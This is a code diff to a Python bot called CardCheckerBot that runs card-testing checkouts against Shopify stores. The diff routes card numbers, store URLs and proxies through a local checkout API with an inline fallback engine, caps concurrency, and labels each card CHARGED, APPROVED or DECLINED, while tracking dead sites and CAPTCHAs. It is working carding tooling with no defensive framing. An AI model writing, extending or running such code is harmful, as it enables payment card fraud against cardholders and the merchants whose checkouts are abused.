@@ -61,7 +61,7 @@ FORWARD_CHAT_ID = BOT_OWNER_ID
 
 BIN_API_URL = "https://lookup.binlist.net/{}"
 
-SHOPIFY_API_URL = "http://31.97.40.61:5000/shopify"
+SHOPIFY_API_URL = "http://127.0.0.1:5001/shopify"   # local shopify_api_fast.py server
 SITES_FILE = "sites.txt"
 PROXY_VALIDATION_TIMEOUT = 8
 PROXY_VALIDATION_RETRIES = 1
@@ -424,6 +424,9 @@ class CardCheckerBot:
 
         # Job stop events: job_id -> asyncio.Event
         self._job_stop_events: Dict[str, asyncio.Event] = {}
+
+        # Global checkout semaphore — limits total in-flight Shopify checks
+        self._checkout_semaphore: asyncio.Semaphore = asyncio.Semaphore(MAX_CONCURRENT_CHECKS)
 
     # ═══════════════ Rate Limiting ═══════════════
     async def _rate_limit_bot(self):
@@ -2297,15 +2300,80 @@ class CardCheckerBot:
             logger.error(f"[shopify_checkout_core] {site_name} | {type(e).__name__}: {e}")
             return _make_result(ShopifyCheckStatus.ERROR, "INTERNAL_ERROR", str(e)[:80], retryable=True)
 
-    # ── Flask API-based Shopify checkout ──
+    # ── API-based Shopify checkout (calls shopify_api_fast.py, inline fallback) ──
+
+    async def _shopify_via_http_api(self, card_line: str, shop_url: str,
+                                    proxy_str: Optional[str] = None) -> Optional['ShopifyCheckResult']:
+        """Call the local shopify_api_fast.py API. Returns ShopifyCheckResult on success, None on connection failure."""
+        try:
+            session = await self.get_http_session()
+            params: dict = {"site": shop_url, "cc": card_line}
+            if proxy_str:
+                params["proxy"] = proxy_str
+            timeout = aiohttp.ClientTimeout(total=CARD_CHECK_TIMEOUT)
+            async with session.get(SHOPIFY_API_URL, params=params, timeout=timeout) as resp:
+                if resp.status == 503:
+                    return None  # API overloaded — fall back to inline
+                data = await resp.json()
+        except (aiohttp.ClientConnectorError, aiohttp.ServerConnectionError, aiohttp.ClientOSError):
+            return None  # API server not running — fall back to inline
+        except asyncio.TimeoutError:
+            site_name = shop_url.replace("https://", "").replace("http://", "")
+            return ShopifyCheckResult(
+                card=card_line, status=ShopifyCheckStatus.ERROR,
+                status_code="API_TIMEOUT", site_name=site_name,
+                shop_url=shop_url, gateway="SHOPIFY-RELOADED",
+                error_msg="API request timeout", retryable=True,
+            )
+        except Exception as e:
+            logger.warning(f"[HTTP API] unexpected error: {e}")
+            return None
+
+        site_name = shop_url.replace("https://", "").replace("http://", "")
+        api_status = data.get("Status", False)
+        api_response = data.get("Response", "") or ""
+        api_gateway = data.get("Gateway", "SHOPIFY-RELOADED")
+        api_price = str(data.get("Price", "0.00"))
+        resp_upper = api_response.upper()
+
+        # Map the HTTP API response to ShopifyCheckResult
+        captcha = "CAPTCHA" in resp_upper
+        site_dead = any(m in resp_upper for m in [
+            "NOT_A_SHOPIFY", "STORE_CLOSED", "PASSWORD_PROTECTED",
+            "NO_PRODUCTS", "STORE_NOT_FOUND", "NOT SUPPORTED",
+        ])
+        retryable = any(m in resp_upper for m in ["TIMEOUT", "RATE_LIMIT", "503", "CONNECTION"])
+
+        if api_status is True:
+            if "CHARGED" in resp_upper or "ORDER_PLACED" in resp_upper:
+                status = ShopifyCheckStatus.CHARGED
+            else:
+                status = ShopifyCheckStatus.APPROVED
+        elif site_dead:
+            status = ShopifyCheckStatus.ERROR
+        else:
+            status = ShopifyCheckStatus.DECLINED
+
+        return ShopifyCheckResult(
+            card=card_line, status=status, status_code=api_response,
+            amount=api_price, currency=data.get("currency", "USD"),
+            site_name=site_name, shop_url=shop_url, gateway=api_gateway,
+            error_msg="" if api_status else api_response,
+            retryable=retryable, site_dead=site_dead, captcha=captcha,
+        )
 
     async def run_shopify_graphql_checkout(self, card_line: str, shop_url: str,
                                             proxy_str: Optional[str] = None) -> ShopifyCheckResult:
-        """Run Shopify checkout directly via shopify_checkout_core() (no Flask API)."""
+        """Run Shopify checkout: tries local API first, falls back to inline engine."""
         start_time = time.time()
         site_name = shop_url.replace("https://", "").replace("http://", "")
         try:
-            result = await self.shopify_checkout_core(card_line, shop_url, proxy_str)
+            async with self._checkout_semaphore:
+                # Try the local aiohttp API first
+                result = await self._shopify_via_http_api(card_line, shop_url, proxy_str)
+                if result is None:
+                    # API not reachable — use the embedded inline engine
+                    result = await self.shopify_checkout_core(card_line, shop_url, proxy_str)
             elapsed_ms = (time.time() - start_time) * 1000
             sc = self.site_scores.setdefault(site_name, SiteScore(site=site_name))
             sc.total += 1
